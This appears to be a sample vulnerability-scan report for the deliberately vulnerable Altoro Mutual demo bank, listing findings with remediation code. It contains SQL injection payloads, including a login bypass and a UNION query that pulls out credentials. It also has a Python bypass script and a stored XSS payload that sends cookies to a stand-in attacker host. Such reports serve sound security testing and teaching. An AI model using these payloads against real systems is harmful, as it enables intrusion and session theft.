# Example Scan Report — Altoro Mutual
## http://altoro.testfire.net

> This is an example of a WTSA scan output for reference.
> Altoro Mutual is a deliberately vulnerable Java/JSP banking demo application by IBM.

---

## WTSA Scan — Altoro Mutual
**Target:** http://altoro.testfire.net  
**Date:** March 2026  
**Stack:** Java (Apache Tomcat / JSP) + MySQL  
**WAF:** None  
**Modules:** XSS, SQLi  

---

### Overall Risk: 🔴 CRITICAL

| Severity | Count |
|---|---|
| 🔴 Critical | 2 |
| 🟠 High | 2 |
| 🟡 Medium | 1 |
| **Total** | **5** |

---

### Fingerprint

| Property | Value |
|---|---|
| Application | Altoro Mutual (IBM WebSphere demo) |
| Backend | Java / Apache Tomcat / JSP |
| Database | MySQL |
| WAF | None |
| Server | Apache-Coyote/1.1 |
| Cookie | JSESSIONID (no HttpOnly, no Secure) |
| Confidence | High |

---

### Threats Detected

---

#### Finding 01 — 🔴 SQL Injection: Login Form Authentication Bypass | CVSS 9.8 | CWE-89

**Endpoint:** `POST /bank/login`  
**Parameter:** `uid`  
**Payload:** `' OR '1'='1'--`  
**Confidence:** Confirmed  

**Evidence:** Login redirects to `/bank/portal.php` — authentication fully bypassed without valid credentials.

**Reproduction Steps:**
1. Navigate to `http://altoro.testfire.net/bank/login`
2. Enter `' OR '1'='1'--` in the username field
3. Enter any value in the password field
4. Click Login
5. Observe redirect to portal — authentication bypassed

**Exploit Script:**
```python
# LEGAL DISCLAIMER: Authorised use only — Altoro Mutual is a training target.
import requests

TARGET = 'http://altoro.testfire.net/bank/login'
PAYLOAD = "' OR '1'='1'--"

s = requests.Session()
r = s.post(TARGET, data={
    'uid': PAYLOAD,
    'passw': 'anything',
    'btnSubmit': 'Login'
}, allow_redirects=True)

if 'logout' in r.text.lower():
    print('[+] Authentication bypass SUCCESSFUL')
print(f'Status: {r.status_code}')
```

**Remediation (Java):**
```java
// VULNERABLE:
String sql = "SELECT * FROM users WHERE uid='" + uid + "' AND passw='" + passw + "'";

// FIXED — PreparedStatement:
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE uid=? AND passw=?"
);
stmt.setString(1, uid);
stmt.setString(2, passw);
ResultSet rs = stmt.executeQuery();
```

---

#### Finding 02 — 🔴 SQL Injection: Search Query UNION Extraction | CVSS 9.8 | CWE-89

**Endpoint:** `GET /search.jsp`  
**Parameter:** `query`  
**Payload:** `' UNION SELECT NULL, username, password FROM users--`  
**Confidence:** Confirmed  

**Remediation:** Same as Finding 01 — PreparedStatement for all SQL queries.

---

#### Finding 03 — 🟠 Stored XSS: Feedback Form | CVSS 8.8 | CWE-79

**Endpoint:** `POST /feedback.jsp`  
**Parameter:** `message`  
**Payload:** `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`  
**Confidence:** Confirmed  

**Remediation (Java JSP):**
```java
// FIXED — HTML encode all output:
<%@ taglib uri="http://java.sun.com/jsp/jstl/functions" prefix="fn" %>
${fn:escapeXml(message)}
```

---

#### Finding 04 — 🟠 SQL Injection: Account Parameter Blind Boolean | CVSS 8.8 | CWE-89

**Endpoint:** `GET /bank/account`  
**Parameter:** `acct`  
**Payload:** `1 AND 1=1--` (true) vs `1 AND 1=2--` (false)  
**Confidence:** Confirmed  

---

#### Finding 05 — 🟡 Reflected XSS: Search Query | CVSS 6.1 | CWE-79

**Endpoint:** `GET /search.jsp`  
**Parameter:** `query`  
**Payload:** `<script>alert(document.cookie)</script>`  
**Confidence:** Confirmed  

**Remediation:**
```java
// FIXED:
out.println("No results for: " + StringEscapeUtils.escapeHtml4(query));
```

---

### Remediation Priority

1. **Immediate:** Replace all SQL string concatenation with PreparedStatement — affects all Java DAO classes
2. **Immediate:** HTML-encode all user input before rendering — use JSTL `fn:escapeXml()` or OWASP Java Encoder
3. **This sprint:** Set `HttpOnly` and `Secure` flags on `JSESSIONID` cookie
4. **This sprint:** Add `Content-Security-Policy: default-src 'self'` header
5. **This quarter:** Upgrade from Apache Tomcat to current LTS release
